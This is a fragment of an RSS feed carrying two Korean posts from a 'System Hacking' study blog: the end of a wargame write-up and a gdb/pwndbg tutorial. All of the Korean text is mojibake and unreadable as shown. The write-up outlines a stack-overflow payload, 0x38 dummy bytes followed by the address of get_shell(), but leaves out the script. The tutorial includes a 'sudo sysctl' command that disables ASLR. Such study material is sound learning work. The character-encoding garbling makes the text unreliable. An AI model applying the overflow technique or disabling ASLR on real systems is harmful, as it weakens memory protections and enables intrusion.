&lt;p&gt;ë”°ë¼ì„œ ìš°ë¦¬ëŠ” ì´ 0x38 byteë¥¼ ë”ë¯¸ê°’ìœ¼ë¡œ ì±„ìš´ í›„, ë§ˆì§€ë§‰ 0x08 byteì— ì‹¤í–‰ë˜ê¸¸ ì›í•˜ëŠ” get_shell() í•¨ìˆ˜ì˜ ì‹œì‘ ì£¼ì†Œë¥¼ ë¶™ì¸ í˜ì´ë¡œë“œë¥¼ ë§Œë“¤ë©´ ëœë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ë ‡ê²Œ ìƒì„±í•œ í˜ì´ë¡œë“œë¥¼ ì •ìƒì ìœ¼ë¡œ í”„ë¡œì„¸ìŠ¤ì— ì…ë ¥í•´ì¤„ ìˆ˜ ìˆëŠ” python ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë§Œë“¤ì–´ ì‹¤í–‰í•˜ë©´ ì…¸ì´ ì‹¤í–‰ë  ê²ƒì´ë‹¤. ì—¬ê¸°ì— í•´ë‹¹ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì ê³  ìì„¸í•œ ë¶„ì„ ë‚´ìš©ì„ ì“¸ê¹Œ ê³ ë¯¼í–ˆì§€ë§Œ, ê·¸ë ‡ê²Œ í•˜ë©´ ìŠ¤í¬ì¼ëŸ¬ê°€ ë ì§€ë„ ëª¨ë¥´ê² ë‹¤ëŠ” ìƒê°ì´ ë“¤ì–´ ìƒëµí•œë‹¤.&lt;/p&gt;

&lt;p&gt;ë‹¤ë§Œ, ìš°ë¦¬ê°€ ì´ì œê¹Œì§€ ë°°ìš´ pwn ë¼ì´ë¸ŒëŸ¬ë¦¬ ìƒì—ì„œ ë¬¸ì œë¥¼ í•´ê²°í•  ìˆ˜ ìˆìœ¼ë©°, ì–´ë–¤ ë©”ì†Œë“œê°€ ì–´ë–¤ í˜•ì‹ì˜ ê°’ì„ ë°›ì•„ ì–´ë–¤ í˜•ì‹ì˜ ê°’ì„ ë¦¬í„´í•˜ëŠ”ì§€, ê·¸ë¦¬ê³  ì…¸ì„ ë•„ìŒì„ ì–´ë–»ê²Œ í™•ì¸í•  ìˆ˜ ìˆì„ì§€ë¥¼ ìƒê°í•˜ê³  ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ëŠ” ê²ƒì„ ì¶”ì²œí•œë‹¤.&lt;/p&gt;
</description>
        <pubDate>Fri, 15 Jul 2022 18:25:23 +0900</pubDate>
        <link>http://localhost:4000/blog/system-hacking-step3-2/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/system-hacking-step3-2/</guid>
      </item>
    
      <item>
        <title>System Hackig Step 3-1</title>
        <description>&lt;h1 id=&quot;stage-3-1&quot;&gt;STAGE 3-1&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;gdb ì„¤ì¹˜ì™€ pwndbg í”ŒëŸ¬ê·¸ì¸ ì„¤ì¹˜í•˜ê¸°.&lt;/li&gt;
  &lt;li&gt;ë§Œì¼ ë­”ê°€ ì˜ëª»í•´ì„œ aslr ì»¤ë§¨ë“œì˜ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ë¡œ~ ë¼ëŠ” ê²½ê³ ë¬¸ì´ ë‚˜ì˜¨ë‹¤ë©´, ê·¸ê±´ ì—¬ëŸ¬ gdb í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜í–ˆê¸° ë•Œë¬¸ì— .gdbinit íŒŒì¼ì´ ì¤‘ë³µë¼ì„œ ìƒê¸°ëŠ” ë¬¸ì œì´ë¯€ë¡œ ~/.gdbinit íŒŒì¼ì„ ê¹¨ë—í•˜ê²Œ ì§€ìš°ê³  ì„¤ì¹˜í–ˆë˜ í”ŒëŸ¬ê·¸ì¸ í´ë”ë“¤ì„ ë‹¤ ì§€ìš´ í›„ gdbê°€ ì—¬ì „íˆ ë‚¨ì•„ ìˆëŠ”ì§€ í™•ì¸ í•œ ë²ˆ í•´ë³´ê³  ë‹¤ì‹œ í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜í•˜ëŠ” ê²ƒì„ ì¶”ì²œí•œë‹¤. ì„¤ì¹˜í•  ë•Œì˜ instructionì„ ì˜ ë”°ë¥´ì.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;gdb-ì‚¬ìš©í•˜ê¸°-ê¸°ì´ˆ&quot;&gt;gdb ì‚¬ìš©í•˜ê¸° ê¸°ì´ˆ&lt;/h1&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;gdbëŠ” ë¦¬ëˆ…ìŠ¤ì˜ ëŒ€í‘œì ì¸ ë””ë²„ê±°&lt;/li&gt;
  &lt;li&gt;ë¬´ë£Œë¡œ ì„¤ì¹˜í•  ìˆ˜ ìˆê³ , ìˆ˜ë§ì€ ìœ ìš©í•œ í”ŒëŸ¬ê·¸ì¸ì„ ê²°í•©í•´ ì‚¬ìš©í•  ìˆ˜ ìˆìŒ.&lt;/li&gt;
  &lt;li&gt;ë‹¤ì–‘í•œ ëª…ë ¹ì–´ê°€ ì¡´ì¬í•˜ë©°, ì ì¬ì ì†Œì— ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•  ë•Œ ê·¸ ì§„ê°€ë¥¼ ë°œíœ˜í•  ìˆ˜ ìˆìŒ.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;prolog&quot;&gt;Prolog&lt;/h2&gt;

&lt;p&gt;ë¦¬ëˆ…ìŠ¤ì˜ ì‹¤í–‰íŒŒì¼ì€ .elfì´ë‹¤. ì´ëŸ° elf íŒŒì¼ì˜ ì •ë³´ë¥¼ ì½ì–´ì˜¤ê¸° ìœ„í•´ ë¦¬ëˆ…ìŠ¤ì—ì„œ ê¸°ë³¸ìœ¼ë¡œ ì œê³µí•˜ê³  ìˆëŠ” ëª…ë ¹ì–´ê°€ ìˆëŠ”ë°, ê·¸ê²ƒì€ ë°”ë¡œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readelf&lt;/code&gt; ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readelf -h {file path}&lt;/code&gt; ë¥¼ ì‹¤í–‰í•´ ëŒ€ìƒ ì‹¤í–‰ íŒŒì¼ì˜ í—¤ë” ì •ë³´ë¥¼ ì½ì–´ì˜¨ ê²°ê³¼ëŠ” ì•„ë˜ì™€ ê°™ì´ í‘œì‹œëœë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled.jpeg&quot; alt=&quot;readelfë¡œ elf íŒŒì¼ì˜ í—¤ë” ì •ë³´ë¥¼ ì½ì–´ì˜¨ ê²°ê³¼&quot; /&gt;&lt;/p&gt;

&lt;p&gt;readelfë¡œ elf íŒŒì¼ì˜ í—¤ë” ì •ë³´ë¥¼ ì½ì–´ì˜¨ ê²°ê³¼&lt;/p&gt;

&lt;p&gt;ì´ë¥¼ ì´ìš©í•´ ëŒ€ìƒ íŒŒì¼ì˜ EP, ì¦‰ entry pointë¥¼ ì•Œ ìˆ˜ ìˆë‹¤. &lt;strong&gt;ë¦¬ë²„ì‹±í•  ë•Œ ì œì¼ ì¤‘ìš”í•œ ê²Œ ë°”ë¡œ ì´ EPë¥¼ ì°¾ëŠ” ê²ƒ&lt;/strong&gt;ì¸ë°, ë¦¬ëˆ…ìŠ¤ í™˜ê²½ì—ì„œ ELF íŒŒì¼ì€ ì†ì‰½ê²Œ EPë¥¼ ì•Œ ìˆ˜ ìˆìœ¼ë¯€ë¡œ ìŠ¤íƒ€íŠ¸ëŠ” ì‰½ê²Œ ëŠì„ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë‹¤ë§Œ ASLR ì´ë¼ê³  ë¦¬ëˆ…ìŠ¤ ìì²´ ë©”ëª¨ë¦¬ ë³´í˜¸ ê¸°ë²•ì´ ìˆëŠ”ë°, í™ì´ë‚˜ ìŠ¤íƒ ë“± ì–´ë–¤ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰í•  ë•Œë§ˆë‹¤ ê·¸ í”„ë¡œì„¸ìŠ¤ì—ê²Œ í• ë‹¹ë˜ëŠ” ê°€ìƒ ë©”ëª¨ë¦¬ì˜ ì£¼ì†Œê°€ ì „ë¶€ ë‹¬ë¼ì§€ëŠ” ê¸°ëŠ¥ì´ ìˆë‹¤. ASLRì´ ì„¤ì •ë˜ì–´ ìˆë‹¤ë©´ ë””ë²„ê¹…í•  ë•Œë§ˆë‹¤ ëª¨ë“  ì£¼ì†Œê°€ ë‹¬ë¼ì§€ëŠ” ì§„ê¸°ëª…ê¸°ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë‹ˆ, ASLRì„ êº¼ë‘ëŠ” ê²ƒì„ ì¶”ì²œí•œë‹¤.&lt;/p&gt;

&lt;p&gt;ASLRì´ í•¨ìˆ˜ì˜ EPì—ë„ ì˜í–¥ì„ ì£¼ëŠ”ì§€ëŠ” ë‚´ê°€ ë°©ê¸ˆ ASLRì„ ë„ê³  ë””ë²„ê¹…í•´ì„œ í™•ì¸í–ˆë‹¤. ì§„ì§œë¡œ ë„ëŠ” ê²ƒì„ ê°•ë ¥ ì¶”ì²œí•œë‹¤.&lt;/p&gt;

&lt;p&gt;ASLRì„ í•´ì œí•˜ê¸° ìœ„í•´ì„œëŠ” ì•„ë˜ì˜ ëª…ë ¹ì–´ë¥¼ í„°ë¯¸ë„ì— ì…ë ¥í•˜ë©´ ëœë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo sysctl -w kernel.randomize_va_space=0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;í•´ë‹¹ elf íŒŒì¼ì˜ í—¤ë” ì •ë³´ë¥¼ ì•Œì•„ëƒˆë‹¤ë©´, ë“œë””ì–´ gdbë¥¼ ì´ìš©í•´ ì‹¤í–‰ íŒŒì¼ì„ ë¶„ì„í•´ ë³¼ ì‹œê°„ì´ë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb {file_path}&lt;/code&gt; ë¥¼ ì‹¤í–‰í•´ gdbë¥¼ í•´ë‹¹ íŒŒì¼ì— ë¶™ì¸ë‹¤.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;start&lt;/code&gt; ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•œë‹¤.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%201.jpeg&quot; alt=&quot;start ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•œ ê²°ê³¼.&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;start ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•œ ê²°ê³¼.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;gdbì˜ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;start&lt;/code&gt; ëª…ë ¹ì–´ëŠ” EPë¶€í„° í”„ë¡œê·¸ë¨ì„ ë¶„ì„í•  ìˆ˜ ìˆê²Œ í•´ì¤€ë‹¤.&lt;/li&gt;
      &lt;li&gt;í˜„ì¬ ripì˜ ê°’ì€ DISASM ì„¹ì…˜ì˜ í™”ì‚´í‘œê°€ ê°€ë¦¬í‚¤ê³  ìˆëŠ” ì£¼ì†Œì´ë‹¤.
        &lt;ul&gt;
          &lt;li&gt;ì´ ê²½ìš° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x555555555149&lt;/code&gt; ì„ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1149&lt;/code&gt; ì— BPê°€ ê±¸ë¦° ê±¸ ë³´ë‹ˆ ì´ í”„ë¡œì„¸ìŠ¤ì˜ EPëŠ” ì˜¤í”„ì…‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1149&lt;/code&gt; ì¼ ê²ƒì´ë‹¤.&lt;/li&gt;
          &lt;li&gt;
            &lt;p&gt;ì•„ë‹ˆ ì•ì—ì„œëŠ” EP ì£¼ì†Œê°€ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1060&lt;/code&gt; ì¸ë° ì™œ mainì˜ ì—”íŠ¸ë¦¬ëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1149&lt;/code&gt; ì¸ ê±°ì•¼???&lt;/p&gt;

            &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%202.jpeg&quot; alt=&quot;ì´í•´ê°€ ì•ˆ ë¼ì„œ mainì˜ ì—”íŠ¸ë¦¬ì™€ ì›ë˜ ì—”íŠ¸ë¦¬ë¡œ ì˜ˆìƒë˜ëŠ” ì£¼ì†Œì˜ ë°ì´í„°ë¥¼ ì²´í¬í•´ ë³´ì•˜ë‹¤.&quot; /&gt;&lt;/p&gt;

            &lt;p&gt;ì´í•´ê°€ ì•ˆ ë¼ì„œ mainì˜ ì—”íŠ¸ë¦¬ì™€ ì›ë˜ ì—”íŠ¸ë¦¬ë¡œ ì˜ˆìƒë˜ëŠ” ì£¼ì†Œì˜ ë°ì´í„°ë¥¼ ì²´í¬í•´ ë³´ì•˜ë‹¤.&lt;/p&gt;

            &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_start&lt;/code&gt; í•¨ìˆ˜ëŠ” ì»´íŒŒì¼í•  ë•Œ ìë™ìœ¼ë¡œ ë”°ë¼ì™€ ë¶™ëŠ” í•¨ìˆ˜ì¸ë°, í•´ë‹¹ í•¨ìˆ˜ì˜ ë ë¶€ë¶„ì—ì„œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__libc_start_main&lt;/code&gt; ì´ë¼ëŠ” dllì„ í˜¸ì¶œí•œë‹¤. í•´ë‹¹ dllì—ì„œ ì—°ì‡„ì ì¸ í˜¸ì¶œ ê³¼ì •ì„ ê±°ì³ì„œ ë‚´ê°€ ë§Œë“  í”„ë¡œì„¸ìŠ¤ì˜ ì§„ì§œ ì—”íŠ¸ë¦¬ì¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; ì´ í˜¸ì¶œë˜ê¸° ë•Œë¬¸ì´ ì´ì™€ ê°™ì€ ë¶ˆì¼ì¹˜ í˜„ìƒì´ ì¼ì–´ë‚˜ëŠ” ê²ƒì´ë‹¤.&lt;/p&gt;

            &lt;p&gt;í•œ ë§ˆë””ë¡œ elf íŒŒì¼ì˜ ì—”íŠ¸ë¦¬ëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_start&lt;/code&gt; í•¨ìˆ˜ë¶€í„°ë¼ê³  ì¸ì‹í•˜ì§€ë§Œ, gdbë¥¼ ë¶™ì—¬ì„œ ëŒë ¸ì„ ë•Œ gdbëŠ” ì“¸ë°ì—†ëŠ” dll ì‹¤í–‰ì€ ë„˜ê²¨ ë²„ë¦¬ê³  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; ì— BPë¥¼ ë§Œë“¤ê¸° ë•Œë¬¸ì— ë°œìƒí•˜ëŠ” í˜„ìƒì´ë‹¤. &lt;del&gt;gdbê°€ ë„ˆë¬´ ë˜‘ë˜‘í•´ì„œ ìƒê¸´ ë¬¸ì œì˜€ë‹¤â€¦!&lt;/del&gt;&lt;/p&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;context-pwndbgì˜-ëŒ€ì‹œë³´ë“œ&quot;&gt;Context: pwndbgì˜ ëŒ€ì‹œë³´ë“œ&lt;/h2&gt;

&lt;p&gt;ì‚¬ì‹¤ Contextë¼ëŠ” ë§ì€ í”„ë¡œì„¸ìŠ¤ ê´€ë ¨í•´ì„œ ë§ì´ ì“°ì´ëŠ” ë§ì´ë‹¤. pwndbgëŠ” ì´ëŸ° contextì˜ íŠ¹ì„±ì„ ì°¨ìš©í•´ &lt;strong&gt;í”„ë¡œì„¸ìŠ¤ ì‹¤í–‰ ì‹œ ì£¼ìš” ë©”ëª¨ë¦¬ë“¤ì˜ ì‹¤ì‹œê°„ ìƒíƒœë¥¼ ë³´ì—¬ì£¼ëŠ”&lt;/strong&gt; ìì‹ ì˜ ëŒ€ì‹œë³´ë“œë¥¼ &lt;strong&gt;Context&lt;/strong&gt;ë¼ê³  ì¹­í•˜ê³  ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;pwndbgì˜ contextëŠ” í¬ê²Œ 4ê°œì˜ ì˜ì—­ìœ¼ë¡œ êµ¬ë¶„ëœë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Registers: ë ˆì§€ìŠ¤í„°ì˜ ìƒíƒœë¥¼ ë³´ì—¬ì¤€ë‹¤. ë ˆì§€ìŠ¤í„°ì˜ ì¢…ë¥˜ê°€ ë­ì˜€ì§€? ë¼ëŠ” ì˜ë¬¸ì´ ë“ ë‹¤ë©´ &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step2/#/&quot;&gt;System Hacking Step2: Computer Architecture&lt;/a&gt; ì°¸ê³ .&lt;/li&gt;
  &lt;li&gt;Disasm: ripë¶€í„° ì‹œì‘í•´ì„œ ì—¬ëŸ¬ ì¤„ì— ê±¸ì³ ë””ìŠ¤ì–´ì…ˆë¸”ëœ ê²°ê³¼ë¥¼ ë³´ì—¬ì£¼ëŠ” ì„¹ì…˜ì´ë‹¤. ì¦‰, ì•ìœ¼ë¡œ ì‹¤í–‰ë  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ë“¤ì„ ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ ë³´ì—¬ì£¼ëŠ” ì„¹ì…˜ì´ë‹¤.&lt;/li&gt;
  &lt;li&gt;Stack: rspë¶€í„° ì—¬ëŸ¬ ì¤„ì— ê±¸ì³ ìŠ¤íƒì˜ ê°’ë“¤ì„ ë³´ì—¬ì¤€ë‹¤. ìŠ¤íƒì˜ ë§¨ ìœ„ë¶€í„° ë­ê°€ ìˆëŠ”ì§€(ìŠ¤íƒì— ë­ê°€ ë“¤ì–´ìˆëŠ”ì§€ ê°€ì¥ ìµœì‹ ì˜ ê²ƒë¶€í„°)ë¥¼ ì–´ëŠ ì •ë„ ë³´ì—¬ì¤€ë‹¤ëŠ” ëœ»ì´ë‹¤.&lt;/li&gt;
  &lt;li&gt;Backtrace: í˜„ì¬ ripì— ë„ë‹¬í•  ë•Œê¹Œì§€ ì–´ë–¤ í•¨ìˆ˜ë“¤ì´ ì¤‘ì²©ë˜ì–´ í˜¸ì¶œëëŠ”ì§€ ë³´ì—¬ì¤€ë‹¤. í™”ì‚´í‘œê°€ ìˆëŠ” ë¶€ë¶„ì´ í˜„ì¬ ripê°€ ìˆëŠ” í•¨ìˆ˜ì´ê³ , ê·¸ ë°‘ì— ìˆëŠ” ê²ƒë“¤ì´ ì´ì œê¹Œì§€ í˜¸ì¶œëë˜ í•¨ìˆ˜ ëª©ë¡ì´ë‹¤. ë³´í†µ ì´ëŸ¬ë©´ ì½œìŠ¤íƒ ë³´ì—¬ì£¼ì§€ ì•Šë‚˜? ì™œ êµ³ì´ ì´ë¯¸ ì§€ë‚˜ê°€ì„œ ê¸°ëŠ¥ì´ ëë‚œ í•¨ìˆ˜ë“¤ì„ ë³´ì—¬ì£¼ë ¤ í•˜ì§€?&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;breakcontinue&quot;&gt;break&amp;amp;continue&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;gdbë¥¼ ì´ìš©í•´ í”„ë¡œê·¸ë¨ì„ ë¶„ì„í•  ë•, í”„ë¡œê·¸ë¨ì˜ ë™ì‘ ì¤‘ ì•„ì£¼ ì¼ë¶€ë¶„ì—ë§Œ ê´€ì‹¬ì´ ìˆì„ ë•Œì´ë‹¤.&lt;/li&gt;
  &lt;li&gt;ì´ëŸ¬í•œ ëª©ì  ë‹¬ì„±ì„ ìœ„í•´ breakì™€ continueë¼ëŠ” ê¸°ëŠ¥ì´ ìˆë‹¤.
    &lt;ul&gt;
      &lt;li&gt;break: íŠ¹ì • ì£¼ì†Œì— ì¤‘ë‹¨ì (breakpoint)ë¥¼ ì„¤ì •í•˜ëŠ” ê¸°ëŠ¥&lt;/li&gt;
      &lt;li&gt;continue: í˜„ì¬ ì§€ì ì—ì„œ ë‹¤ìŒ ì¤‘ë‹¨ì ê¹Œì§€ ë©ˆì¶¤ ì—†ì´ ì‹¤í–‰í•˜ëŠ” ê¸°ëŠ¥&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;run&quot;&gt;run&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;í”„ë¡œê·¸ë¨ì„ ë‹¨ìˆœíˆ ì‹¤í–‰ë§Œ ì‹œí‚¤ëŠ” ëª…ë ¹ì–´.&lt;/li&gt;
  &lt;li&gt;ì¤‘ë‹¨ì ì—ì„œ ë©ˆì¶”ì§€ë§Œ, &lt;strong&gt;í”„ë¡œê·¸ë¨ì„ ì²˜ìŒë¶€í„° ì‹œì‘í•œë‹¤-ì¤‘ë‹¨ì ì´ ìˆìœ¼ë©´ ë©ˆì¶˜ë‹¤&lt;/strong&gt;ì˜ ì‹œí€€ìŠ¤ì´ë¯€ë¡œ &lt;strong&gt;ì¤‘ë‹¨ì ì—ì„œ ì‹œì‘í•œë‹¤-ë‹¤ìŒ ì¤‘ë‹¨ì ì—ì„œ ë©ˆì¶˜ë‹¤&lt;/strong&gt;ì˜ ì‹œí€€ìŠ¤ë¥¼ ê°€ì§„ &lt;strong&gt;continueì™€ëŠ” í™•ì—°í•œ ì°¨ì´ì &lt;/strong&gt;ì´ ìˆë‹¤.&lt;/li&gt;
&lt;/ul&gt;

&lt;aside&gt;
âš™ gdbëŠ” ëª…ë ¹ì–´ ì¤„ì—¬ì“°ê¸° ê¸°ëŠ¥ì„ ì œê³µí•˜ê¸° ë•Œë¬¸ì—, ëª…ë ¹ì–´ë¥¼ íŠ¹ì •í•  ìˆ˜ ìˆëŠ” ìµœì†Œí•œì˜ ë¬¸ìì—´ë§Œ ì…ë ¥í•˜ë©´ ìë™ìœ¼ë¡œ ëª…ë ¹ì–´ë¥¼ ì°¾ì•„ì„œ ìˆ˜í–‰í•´ ì¤€ë‹¤. ì˜ˆë¥¼ ë“¤ì–´ì„œ, ì•ì„œ ì„¤ëª…í•œ breakëŠ” bë§Œ ì³ë„ ë˜ê³ , continueì˜ ê²½ìš°ì—ëŠ” cë§Œ ì³ë„ ëœë‹¤. run ë˜í•œ rë§Œ ì³ë„ ìë™ìœ¼ë¡œ ì‹¤í–‰ëœë‹¤.

&lt;/aside&gt;

&lt;h2 id=&quot;disassembly&quot;&gt;disassembly&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;gdbì—ì„œ ê¸°ë³¸ìœ¼ë¡œ ì œê³µí•˜ëŠ” ë””ìŠ¤ì–´ì…ˆë¸” ëª…ë ¹ì–´.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;í•¨ìˆ˜ ì´ë¦„ì„ ì¸ìë¡œ ì „ë‹¬í•˜ë©´ í•´ë‹¹ í•¨ìˆ˜ê°€ ë¦¬í„´ë  ë•Œê¹Œì§€ ì „ë¶€ ë””ìŠ¤ì–´ì…ˆë¸”í•´ ë³´ì—¬ì¤€ë‹¤.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;pwndbgì—ì„œëŠ” &lt;strong&gt;u, nearpc, pdisassemble&lt;/strong&gt;ì„ ì œê³µí•œë‹¤. ë””ìŠ¤ì–´ì…ˆë¸”ëœ ì½”ë“œë¥¼ ê°€ë…ì„± ì¢‹ê²Œ ì¶œë ¥í•´ì¤€ë‹¤ëŠ” ì ì—ì„œ ì“¸ ë§Œí•˜ë‹¤!&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%205.jpeg&quot; alt=&quot;í™•ì‹¤íˆ ë‚«ë‹¤.&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;í™•ì‹¤íˆ ë‚«ë‹¤.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;navigate-ni-si-finish&quot;&gt;navigate: ni, si, finish&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ëª…ë ¹ì–´ë¥¼ í•œ ì¤„ì”© ìì„¸íˆ ë¶„ì„í•˜ëŠ” ê¸°ëŠ¥.
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;ni(next instruction)&lt;/strong&gt;: ì–´ì…ˆë¸”ë¦¬ ëª…ë ¹ì–´ë¥¼ ë”± í•œ ì¤„ ì‹¤í–‰í•œë‹¤. &lt;strong&gt;ì„œë¸Œë£¨í‹´ì˜ ë‚´ë¶€ë¡œ ë“¤ì–´ê°€ì§€ ì•ŠëŠ”ë‹¤.&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;si(step into)&lt;/strong&gt;: ì–´ì…ˆë¸”ë¦¬ ëª…ë ¹ì–´ë¥¼ ë”± í•œ ì¤„ ì‹¤í–‰í•œë‹¤. &lt;strong&gt;ì„œë¸Œë£¨í‹´ì˜ ë‚´ë¶€ë¡œ ë“¤ì–´ê°„ë‹¤.&lt;/strong&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;strong&gt;finish&lt;/strong&gt;: í•¨ìˆ˜ ê·œëª¨ê°€ ë„ˆë¬´ ì»¤ì„œ nië¡œëŠ” ë„ë¬´ì§€ ì›ë˜ í•¨ìˆ˜ë¡œ ëŒì•„ì˜¬ ìˆ˜ ì—†ëŠ” ê²½ìš°, í˜„ì¬ ìœ„ì¹˜í•œ í•¨ìˆ˜ì˜ ë§¨ ëê¹Œì§€ í•œë²ˆì— ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ëª…ë ¹ì–´.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ì„œë¸Œë£¨í‹´ì´ë€?
    &lt;ul&gt;
      &lt;li&gt;í•¨ìˆ˜ ë‚´ë¶€ì—ì„œ ë‹¤ë¥¸ í•¨ìˆ˜ë¥¼ ì½œí•  ë•Œ, ê·¸ ë‹¤ë¥¸ í•¨ìˆ˜ì˜ ì‹¤í–‰ ë£¨í‹´ì„ ì„œë¸Œë£¨í‹´ì´ë¼ê³  í•œë‹¤.&lt;/li&gt;
      &lt;li&gt;ì¦‰ ì„œë¸Œë£¨í‹´ì˜ ë‚´ë¶€=í˜„ì¬ í•¨ìˆ˜ì—ì„œ ì½œí•œ ë‹¤ë¥¸ í•¨ìˆ˜ì˜ ë‚´ë¶€&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;examine-x&quot;&gt;examine: x&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ê°€ìƒ ë©”ëª¨ë¦¬ì— ì¡´ì¬í•˜ëŠ” ì„ì˜ ì£¼ì†Œì˜ ê°’ì„ ê´€ì°°í•´ì•¼ í•  ë•Œ ì‚¬ìš©í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;x&lt;/strong&gt;: &lt;strong&gt;ì›í•˜ëŠ” ì£¼ì†Œ&lt;/strong&gt;ì—ì„œ, &lt;strong&gt;ì›í•˜ëŠ” ê¸¸ì´&lt;/strong&gt;ë§Œí¼ì˜ ë°ì´í„°ë¥¼ &lt;strong&gt;ì›í•˜ëŠ” í˜•ì‹ìœ¼ë¡œ ì¸ì½”ë”©&lt;/strong&gt;í•´ í™•ì¸í•  ìˆ˜ ìˆë‹¤.
    &lt;ul&gt;
      &lt;li&gt;í˜•ì‹: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x/{ì›í•˜ëŠ” ë°ì´í„° ë¬¶ìŒ ìˆ˜}{í•œ ë°ì´í„° ë¬¶ìŒì˜ ê¸¸ì´}{ë°ì´í„° í˜•ì‹}  {ë©”ëª¨ë¦¬ ì£¼ì†Œ}&lt;/code&gt;
        &lt;ul&gt;
          &lt;li&gt;í•œ ë°ì´í„° ë¬¶ìŒì˜ ê¸¸ì´(size): b(byte), h(halfword), w(word), g(giant; 8 bytes)&lt;/li&gt;
          &lt;li&gt;ë°ì´í„°ì˜ í˜•ì‹(format): o(octal), x(hex), d(decimal), u(unsigned decimal), t(binary), f(float), a(address), i(instruction), c(char), s(string), z(hex, zero padded on the left)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

